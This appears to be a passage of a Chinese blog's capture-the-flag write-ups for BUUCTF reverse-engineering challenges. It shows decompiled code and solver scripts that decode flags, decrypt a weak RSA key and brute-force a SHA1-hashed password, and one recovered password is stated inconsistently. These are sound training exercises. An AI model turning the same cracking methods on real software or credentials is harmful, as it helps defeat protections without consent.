  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+1Ch] [rbp-44h]</span>
  <span class="hljs-type">char</span> src[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-40h]</span>
  __int64 v7; <span class="hljs-comment">// [rsp+28h] [rbp-38h]</span>
  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+30h] [rbp-30h]</span>
  __int64 v9; <span class="hljs-comment">// [rsp+40h] [rbp-20h]</span>
  __int64 v10; <span class="hljs-comment">// [rsp+48h] [rbp-18h]</span>
  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [rsp+50h] [rbp-10h]</span>
  <span class="hljs-type">unsigned</span> __int64 v12; <span class="hljs-comment">// [rsp+58h] [rbp-8h]</span>

  v12 = __readfsqword(<span class="hljs-number">0x28</span>u);
  *(_QWORD *)src = <span class="hljs-string">&#x27;SLCDN&#x27;</span>;
  v7 = <span class="hljs-string">&#x27;\0&#x27;</span>;
  v8 = <span class="hljs-number">0</span>;
  v9 = <span class="hljs-string">&#x27;wodah&#x27;</span>;
  v10 = <span class="hljs-number">0LL</span>;
  v11 = <span class="hljs-number">0</span>;
  text = join(key3, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v9);<span class="hljs-comment">//就是这小端序存储 text=killshadow</span>
  <span class="hljs-built_in">strcpy</span>(key, key1);<span class="hljs-comment">//key=“ADSFK”</span>
  <span class="hljs-built_in">strcat</span>(key, src);<span class="hljs-comment">//key=“ADSFKNDCLS”小端序存储</span>
  v2 = <span class="hljs-number">0</span>;
  v3 = <span class="hljs-number">0</span>;
  getchar();
  v5 = <span class="hljs-built_in">strlen</span>(key);
  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5; ++i )
  &#123;
    <span class="hljs-keyword">if</span> ( key[v3 % v5] &gt; <span class="hljs-number">64</span> &amp;&amp; key[v3 % v5] &lt;= <span class="hljs-number">90</span> )
      key[i] = key[v3 % v5] + <span class="hljs-number">32</span>;
    ++v3;
  &#125;<span class="hljs-comment">//通过分析就可以知道，这是大写变小写</span>
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input your flag:&quot;</span>, src);
  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )
  &#123;
    v1 = getchar();
    <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">10</span> )
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">32</span> )
    &#123;
      ++v2;
    &#125;
    <span class="hljs-keyword">else</span>
    &#123;
      <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">96</span> || v1 &gt; <span class="hljs-number">122</span> )
      &#123;
        <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">64</span> &amp;&amp; v1 &lt;= <span class="hljs-number">90</span> )
          str2[v2] = (v1 - <span class="hljs-number">39</span> - key[v3++ % v5] + <span class="hljs-number">97</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;
      &#125;
      <span class="hljs-keyword">else</span>
      &#123;
        str2[v2] = (v1 - <span class="hljs-number">39</span> - key[v3++ % v5] + <span class="hljs-number">97</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;
      &#125;
      <span class="hljs-keyword">if</span> ( !(v3 % v5) )
        <span class="hljs-built_in">putchar</span>(<span class="hljs-number">32</span>);
      ++v2;
    &#125;
  &#125;<span class="hljs-comment">//通过分析可以知道，通过一系列变换后等于text就可以了</span>
  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(text, str2) )
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulation!\n&quot;</span>);
  <span class="hljs-keyword">else</span>
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try again!\n&quot;</span>);
  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v12;
&#125;
</code></pre>

<p>快捷键H转换src和v9[0]<br><img src="https://img-blog.csdnimg.cn/250cdaf6bddc466db818f0fa8a35b52a.png#pic_center" alt="在这里插入图片描述"><br>可以看到这里的两个十六进制是大端序，但是数据在内存中都是小端序，所以要将其，反转一下。一般在CPU，x86都是小端序，但是IDA将之转换为了大端序。<br>快捷键R将其转为字符<br><img src="https://img-blog.csdnimg.cn/5376529ebb3d4d15b402fc7db65f29e7.png#pic_center" alt="在这里插入图片描述"><br>key3已知为”killls”<br><img src="https://img-blog.csdnimg.cn/c6c153a401214734bc1687ae13c6d365.png#pic_center" alt="在这里插入图片描述"><br>再看这有一个join函数，它的作用是以指定的字符连接成一个新的字符串。此处是将key3 和 v9 连接成一个新的字符串。<br>即text = killshadow。<br>strcat函数，是将key 和 src 拼接在一起的函数， 所以key = ADSFKNDCLS。<br>C语言脚本：</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span> </span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
   <span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;adsfkndcls&quot;</span>;
   <span class="hljs-type">char</span> text[] = <span class="hljs-string">&quot;killshadow&quot;</span>;
   <span class="hljs-type">int</span> i;
   <span class="hljs-type">int</span> v3=<span class="hljs-number">10</span>;<span class="hljs-comment">//长度 </span>
   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)
   &#123;
      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">128</span>; j++)
      &#123;
         <span class="hljs-keyword">if</span> (j &lt; <span class="hljs-string">&#x27;A&#x27;</span> || j &gt; <span class="hljs-string">&#x27;z&#x27;</span> || j &gt; <span class="hljs-string">&#x27;Z&#x27;</span> &amp;&amp; j &lt; <span class="hljs-string">&#x27;a&#x27;</span>)
         &#123;
            <span class="hljs-keyword">continue</span>;
         &#125;
         <span class="hljs-keyword">if</span> ((j - <span class="hljs-number">39</span> - key[v3 % <span class="hljs-number">10</span>] + <span class="hljs-number">97</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span> == text[i])
         &#123;
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,j);
            v3++;
            <span class="hljs-keyword">break</span>;
         &#125;
      &#125;
   &#125;
&#125;
</code></pre>
<p>运行得到flag为flag{KLDQCUDFZO}</p>
<h1 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h1><p>打开文件发现是class文件，故用jd-gui打开，反汇编<br><img src="https://img-blog.csdnimg.cn/72e46107e70249c18e83c4ed8684e407.png#pic_center" alt="在这里插入图片描述"><br>分析代码<br>python脚本：</p>
<pre><code class="hljs python">strs = [<span class="hljs-number">180</span>, <span class="hljs-number">136</span>, <span class="hljs-number">137</span>, <span class="hljs-number">147</span>, <span class="hljs-number">191</span>, <span class="hljs-number">137</span>, <span class="hljs-number">147</span>, <span class="hljs-number">191</span>,
 <span class="hljs-number">148</span>, <span class="hljs-number">136</span>, <span class="hljs-number">133</span>, <span class="hljs-number">191</span>, <span class="hljs-number">134</span>, <span class="hljs-number">140</span>, <span class="hljs-number">129</span>, <span class="hljs-number">135</span>, <span class="hljs-number">191</span>, <span class="hljs-number">65</span>]

flag = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(strs)):
   flag += <span class="hljs-built_in">chr</span>(strs[i] - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;@&#x27;</span>) ^ <span class="hljs-number">0x20</span>)
<span class="hljs-built_in">print</span>(flag)
</code></pre>
<p>别人的java脚本：<br><img src="https://img-blog.csdnimg.cn/9e8340877e604f90bb1f88b37fa33ce9.png#pic_center" alt="在这里插入图片描述"><br>运行得到flag为flag{This_is_the_flag_!}</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>刷题记录reverse6</title>
    <url>/2023/09/12/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse6/</url>
    <content><![CDATA[<p>BUUCTF reverse</p>
<h1 id="luck-guy"><a href="#luck-guy" class="headerlink" title="luck_guy"></a>luck_guy</h1><p>拖入exe查壳，无壳拖入64位IDA，F5反汇编<br>shift+F12查看程序里的字符串<br><img src="https://img-blog.csdnimg.cn/456b1cd24ffd48e59feaa75501a6922e.png#pic_center" alt="在这里插入图片描述"><br>双击跟进跳转，ctrl+x找到关键函数<br><img src="https://img-blog.csdnimg.cn/898f742776364eec8d180cd82c7f1dc9.png#pic_center" alt="在这里插入图片描述"><br>代码分析：</p>
<pre><code class="hljs c">v6 = __readfsqword(<span class="hljs-number">0x28</span>u);
  v0 = time(<span class="hljs-number">0LL</span>);
  srand(v0);
  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )
  &#123;
    <span class="hljs-keyword">switch</span> ( rand() % <span class="hljs-number">200</span> )
    &#123;
      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK, it&#x27;s flag:&quot;</span>);
        <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x28</span>uLL);
        <span class="hljs-built_in">strcat</span>((<span class="hljs-type">char</span> *)&amp;s, f1);   <span class="hljs-comment">//f1为GXY&#123;do_not_</span>
        <span class="hljs-built_in">strcat</span>((<span class="hljs-type">char</span> *)&amp;s, &amp;f2);   <span class="hljs-comment">//f2为空</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;s);   <span class="hljs-comment">//flag为f1+f2</span>
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Solar not like you&quot;</span>);
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Solar want a girlfriend&quot;</span>);
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:
        s = <span class="hljs-number">0x7F666F6067756369</span>LL;
        v5 = <span class="hljs-number">0</span>;
        <span class="hljs-built_in">strcat</span>(&amp;f2, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;s);   <span class="hljs-comment">//f2=0x7F666F6067756369</span>
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:
        <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">7</span>; ++j )
        &#123;
          <span class="hljs-keyword">if</span> ( j % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> )
            *(&amp;f2 + j) -= <span class="hljs-number">2</span>;
          <span class="hljs-keyword">else</span>
            --*(&amp;f2 + j);
        &#125;
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">default</span>:
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);
        <span class="hljs-keyword">break</span>;
    &#125;
  &#125;
  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;
&#125;</code></pre>
<p>f2的格式不对，没有形成flag形式，case5的代码对长度为8的字符串进行了操作，f2（0x7F666F6067756369两位一划分）的长度正好也是8，猜测用来与f1进行拼接形成flag的字符串是f2进行了case5操作后的数据<br>脚本：</p>
<pre><code class="hljs python">flag=<span class="hljs-string">&quot;GXY&#123;do_not_&quot;</span>
f2=[<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x69</span>][::-<span class="hljs-number">1</span>] <span class="hljs-comment">#小端序的问题，所以要逆序一下</span>

<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
    <span class="hljs-keyword">if</span> j%<span class="hljs-number">2</span>==<span class="hljs-number">1</span> :
        s=<span class="hljs-built_in">chr</span>(f2[j]-<span class="hljs-number">2</span>)
    <span class="hljs-keyword">else</span>:
        s=<span class="hljs-built_in">chr</span>(f2[j]-<span class="hljs-number">1</span>)

    flag+=s

<span class="hljs-built_in">print</span> (flag)
</code></pre>
<p>运行得到flag为flag{do_not_hate_me}</p>
<h1 id="JustRE"><a href="#JustRE" class="headerlink" title="JustRE"></a>JustRE</h1><p>拖入exe查壳，无壳拖入32位IDA，F5反汇编<br>shift+F12查看程序里的字符串<br><img src="https://img-blog.csdnimg.cn/331ab9a70ed649a88875cd43f237d03c.png#pic_center" alt="在这里插入图片描述"><br>双击跟进，ctrl+x，F5<br><img src="https://img-blog.csdnimg.cn/19e5e93363734aae8869f4035a0cd1fc.png#pic_center" alt="在这里插入图片描述"><br>将19999和0分别带入两个%d%d，得到BJD{1999902069a45792d233ac}<br>因此得到flag为flag{1999902069a45792d233ac}</p>
<h1 id="简单注册器"><a href="#简单注册器" class="headerlink" title="简单注册器"></a>简单注册器</h1><p>附件为apk文件，安卓逆向题，用jadx直接打开可以查看代码（注意打开的时候将文件名改成英文，不然可能会报错）<br>找到核心代码<br><img src="https://img-blog.csdnimg.cn/967c392d8138481792f3bae095cfdbc5.png#pic_center" alt="在这里插入图片描述"><br>写脚本：</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
using namespace <span class="hljs-built_in">std</span>;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span>
&#123;
  
<span class="hljs-built_in">string</span>  x=<span class="hljs-string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span>;
<span class="hljs-type">char</span> a;
<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;
x[<span class="hljs-number">2</span>] = (<span class="hljs-type">char</span>)(x[<span class="hljs-number">2</span>] + x[<span class="hljs-number">3</span>] - <span class="hljs-number">50</span>);
x[<span class="hljs-number">4</span>] =(<span class="hljs-type">char</span>)(x[<span class="hljs-number">2</span>] + x[<span class="hljs-number">5</span>] - <span class="hljs-number">0x30</span>);
x[<span class="hljs-number">30</span>]=(<span class="hljs-type">char</span>)(x[<span class="hljs-number">0x1F</span>] + x[<span class="hljs-number">9</span>] - <span class="hljs-number">0x30</span>);
x[<span class="hljs-number">14</span>] =(<span class="hljs-type">char</span>)(x[<span class="hljs-number">27</span>] + x[<span class="hljs-number">28</span>] - <span class="hljs-number">97</span>);
<span class="hljs-keyword">for</span> (  ;i&lt;<span class="hljs-number">16</span>;++i)
    &#123;
     a = x[<span class="hljs-number">0x1f</span> - i];
     x[<span class="hljs-number">0x1f</span> - i] = x[i];
     x[i] = a;&#125;
    <span class="hljs-built_in">cout</span>&lt;&lt;x; 
<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>得到flag</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>刷题记录reverse8</title>
    <url>/2023/10/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse8/</url>
    <content><![CDATA[<p>BUUCTF REVERSE</p>
<h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><p>首先要知道rsa加密<br>附件有两个，其中一个是公钥，得到e=65537，n=8693448229604811919066606200349480058890565601720302561721665405<br>8378322103517<br>利用网站<a href="http://www.factordb.com/index.php?%E7%9B%B4%E6%8E%A5%E5%88%86%E8%A7%A3N%E5%BE%97%E5%88%B0p%E5%92%8Cq%EF%BC%8Cp=">http://www.factordb.com/index.php?直接分解N得到p和q，p=</a> 285960468890451637935629440372639283459，q=304008741604601924494328155975272418463<br>知道了p和q后我们根据L＝lcm（p－1，q－1） （L为p－1、q－1的最小公倍数）就可以算出L，有了L和E可以根据1 &lt; D &lt; L，E＊D mod L ＝ 1算出D，有了D和N我们就可以根据明文＝密文^D mod N来解密出明文了</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 
<span class="hljs-keyword">import</span> rsa 
 
e = <span class="hljs-number">65537</span>
n = <span class="hljs-number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>
p = <span class="hljs-number">285960468890451637935629440372639283459</span>
q = <span class="hljs-number">304008741604601924494328155975272418463</span>

phin = (q-<span class="hljs-number">1</span>)*(p-<span class="hljs-number">1</span>)

d = gmpy2.invert(e, phin)

key = rsa.PrivateKey(n, e, <span class="hljs-built_in">int</span>(d), p, q)

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\\CTF\\output\\flag.enc&quot;</span>, <span class="hljs-string">&quot;rb+&quot;</span>) <span class="hljs-keyword">as</span> f:
    f = f.read()
    <span class="hljs-built_in">print</span>(rsa.decrypt(f, key))
</code></pre>
<p>注意：解这道题需要额外下载python的插件，但我现在用的是python3.11版本，没有找到对应版本的gmpy插件</p>
<h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>附件有两个文件，output中全为数字，level1的文件拖入64位IDA，F5反编译阅读函数命令。</p>
<pre><code class="hljs csharp"><span class="hljs-built_in">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> **envp</span>)</span>
&#123;
  <span class="hljs-built_in">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span>
  FILE *stream; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span>
  <span class="hljs-built_in">char</span> ptr[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-20h] BYREF</span>
  unsigned __int64 v7; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span>

  v7 = __readfsqword(<span class="hljs-number">0x28</span>u);
  stream = fopen(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-comment">//打开文件flag用来读取</span>
  fread(ptr, <span class="hljs-number">1u</span>LL, <span class="hljs-number">0x14</span>uLL, stream);<span class="hljs-comment">//读取并显示数据</span>
  fclose(stream);<span class="hljs-comment">//关闭流stream</span>
  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">19</span>; ++i )<span class="hljs-comment">//进入for循环</span>
  &#123;
    <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )
      printf(<span class="hljs-string">&quot;%ld\n&quot;</span>, (unsigned <span class="hljs-built_in">int</span>)(ptr[i] &lt;&lt; i));
    <span class="hljs-keyword">else</span>
      printf(<span class="hljs-string">&quot;%ld\n&quot;</span>, (unsigned <span class="hljs-built_in">int</span>)(i * ptr[i]));
  &#125;
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>exp：</p>
<pre><code class="hljs python">a = [<span class="hljs-number">198</span>,<span class="hljs-number">232</span>,<span class="hljs-number">816</span>,<span class="hljs-number">200</span>,<span class="hljs-number">1536</span>,<span class="hljs-number">300</span>,<span class="hljs-number">6144</span>,<span class="hljs-number">984</span>,<span class="hljs-number">51200</span>,<span class="hljs-number">570</span>,<span class="hljs-number">92160</span>,<span class="hljs-number">1200</span>,<span class="hljs-number">565248</span>,<span class="hljs-number">756</span>,<span class="hljs-number">1474560</span>,<span class="hljs-number">800</span>,<span class="hljs-number">6291456</span>,<span class="hljs-number">1782</span>,<span class="hljs-number">65536000</span>]

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>):
    <span class="hljs-keyword">if</span> ((i+<span class="hljs-number">1</span>) &amp; <span class="hljs-number">1</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i] &gt;&gt; (i+<span class="hljs-number">1</span>)), end=<span class="hljs-string">&quot;&quot;</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span> (<span class="hljs-built_in">chr</span>(a[i] // (i+<span class="hljs-number">1</span>)),end=<span class="hljs-string">&quot;&quot;</span>)
</code></pre>
<p>运行结果用flag包上</p>
<h1 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h1><p>拖入32位IDA，F5反编译</p>
<pre><code class="hljs cpp"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pls input the first passwd(1): &quot;</span>);
 <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, Destination);
 <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(Destination) != <span class="hljs-number">6</span> )
 &#123;
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Must be 6 characters!\n&quot;</span>);
   <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);
 &#125;</code></pre>
<p>从上述代码可知第一个密码长度为6，<em><strong>atoi</strong></em> 是将字符串转化成整型的函数</p>
<pre><code class="hljs cpp">v7 = <span class="hljs-built_in">atoi</span>(Destination);
 <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">100000</span> )
   <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);</code></pre>
<p>并且转化为整型的数要大于100000</p>
<pre><code class="hljs cpp"><span class="hljs-built_in">strcat</span>(Destination, <span class="hljs-string">&quot;@DBApp&quot;</span>);<span class="hljs-comment">//将@DBApp连接到密码后面</span>
  v3 = <span class="hljs-built_in">strlen</span>(Destination);<span class="hljs-comment">//连接之后的长度为12</span></code></pre>
<p>sub_10400A函数是个加密函数，用来进行哈希加密的</p>
<pre><code class="hljs csharp"><span class="hljs-built_in">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">sub_401230</span>(<span class="hljs-params">BYTE *pbData, DWORD dwDataLen, LPSTR lpString1</span>)</span>
&#123;
  DWORD i; <span class="hljs-comment">// [esp+4Ch] [ebp-28h]</span>
  CHAR String2[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+50h] [ebp-24h] BYREF</span>
  BYTE v6[<span class="hljs-number">20</span>]; <span class="hljs-comment">// [esp+54h] [ebp-20h] BYREF</span>
  DWORD pdwDataLen; <span class="hljs-comment">// [esp+68h] [ebp-Ch] BYREF</span>
  HCRYPTHASH phHash; <span class="hljs-comment">// [esp+6Ch] [ebp-8h] BYREF</span>
  HCRYPTPROV phProv; <span class="hljs-comment">// [esp+70h] [ebp-4h] BYREF</span>

  <span class="hljs-keyword">if</span> ( !CryptAcquireContextA(&amp;phProv, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1u</span>, <span class="hljs-number">0xF0000000</span>) )
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  <span class="hljs-keyword">if</span> ( CryptCreateHash(phProv, <span class="hljs-number">0x8004</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;phHash) )<span class="hljs-comment">// 创建一个空哈希对象</span>
  &#123;
    <span class="hljs-keyword">if</span> ( CryptHashData(phHash, pbData, dwDataLen, <span class="hljs-number">0</span>) )<span class="hljs-comment">// 对一块数据进行哈希，把它加到指定的哈希对象中</span>
    &#123;
      CryptGetHashParam(phHash, <span class="hljs-number">2u</span>, v6, &amp;pdwDataLen, <span class="hljs-number">0</span>);<span class="hljs-comment">// 得到一个哈希对象参数</span>
      *lpString1 = <span class="hljs-number">0</span>;
      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; pdwDataLen; ++i )
      &#123;
        wsprintfA(String2, <span class="hljs-string">&quot;%02X&quot;</span>, v6[i]);
        lstrcatA(lpString1, String2);
      &#125;
      CryptDestroyHash(phHash);<span class="hljs-comment">// 销毁一个哈希对象</span>
      CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<span class="hljs-comment">// 用于释放从CryptAcquireContext调用返回的句柄      return 1;</span>
    &#125;
    <span class="hljs-keyword">else</span>
    &#123;
      CryptDestroyHash(phHash);
      CryptReleaseContext(phProv, <span class="hljs-number">0</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    &#125;
  &#125;
  <span class="hljs-keyword">else</span>
  &#123;
    CryptReleaseContext(phProv, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  &#125;
&#125;</code></pre>
<p>代码中的0x8004是特殊标识，是sha1算法<br>用python中的hashlib模块爆破第一部分密码</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib
string=<span class="hljs-string">&#x27;@DBApp&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>,<span class="hljs-number">999999</span>):
    flag=<span class="hljs-built_in">str</span>(i)+string
    x = hashlib.sha1(flag.encode(<span class="hljs-string">&quot;utf8&quot;</span>))
    y = x.hexdigest()
    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span> == y:
            <span class="hljs-built_in">print</span>(flag)
            <span class="hljs-keyword">break</span></code></pre>
<p>结果为12321@DBApp，即第一部分密码为123321<br>第二部分密码同样为6位<br>研究函数sub_40100F</p>
<pre><code class="hljs csharp">hResInfo = FindResourceA(<span class="hljs-number">0</span>, (LPCSTR)<span class="hljs-number">0x65</span>, <span class="hljs-string">&quot;AAA&quot;</span>);
  <span class="hljs-keyword">if</span> ( !hResInfo )
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  nNumberOfBytesToWrite = SizeofResource(<span class="hljs-number">0</span>, hResInfo);
  hResData = LoadResource(<span class="hljs-number">0</span>, hResInfo);
  <span class="hljs-keyword">if</span> ( !hResData )
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  lpBuffer = LockResource(hResData);
  <span class="hljs-comment">//这一段代码的含义就是，从AAA文件中查找字符，然后如果没有找到就返回，找到了的话就计算出资源的大小，把资源第一个字符出的指针传给lpBuffer</span></code></pre>
<p>继续向下看，跟进函数sub_401005</p>
<pre><code class="hljs csharp">unsigned <span class="hljs-built_in">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">sub_401420</span>(<span class="hljs-params">LPCSTR lpString, <span class="hljs-built_in">int</span> a2, <span class="hljs-built_in">int</span> a3</span>)</span>
&#123;
  unsigned <span class="hljs-built_in">int</span> result; <span class="hljs-comment">// eax</span>
  unsigned <span class="hljs-built_in">int</span> i; <span class="hljs-comment">// [esp+4Ch] [ebp-Ch]</span>
  unsigned <span class="hljs-built_in">int</span> v5; <span class="hljs-comment">// [esp+54h] [ebp-4h]</span>

  v5 = lstrlenA(lpString);
  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )
  &#123;
    result = i;
    <span class="hljs-keyword">if</span> ( i &gt;= a3 )
      <span class="hljs-keyword">break</span>;
    *(_BYTE *)(i + a2) ^= lpString[i % v5];
  &#125;
  <span class="hljs-keyword">return</span> result;
&#125;</code></pre>
<p>一个主逻辑是异或的函数，转化成正常C如下：</p>
<pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span>
<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+4Ch] [ebp-Ch]</span>
<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+54h] [ebp-4h]</span>

v5 = <span class="hljs-built_in">strlen</span>(lpString);
<span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )
&#123;
  result = i;
  <span class="hljs-keyword">if</span> ( i &gt;= a3 )
    <span class="hljs-keyword">break</span>;
  a2[i] ^= lpString[i % v5];
&#125;
<span class="hljs-keyword">return</span> result;</code></pre>
<p>资源的每一位和密码的每一位循环异或，异或结束之后，生成一个rtf文件<br>.rtf的文件头，异或之后一定生成的是.rtf的文件头内容，查到.rtf文件头的前六位是”{\rtf1”<br>知道一个新的软件叫<strong>ResourceHacker</strong>，用来查看资源<br>资源前6位<br><img src="https://img-blog.csdnimg.cn/b17d0e1814ae4aaeb4b756c90be0c75e.png" alt="在这里插入图片描述"><br>脚本：</p>
<pre><code class="hljs python">s=<span class="hljs-string">&#x27;&#123;\\rtf1&#x27;</span>
a=[<span class="hljs-number">0x05</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x01</span>]
flag=<span class="hljs-string">&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
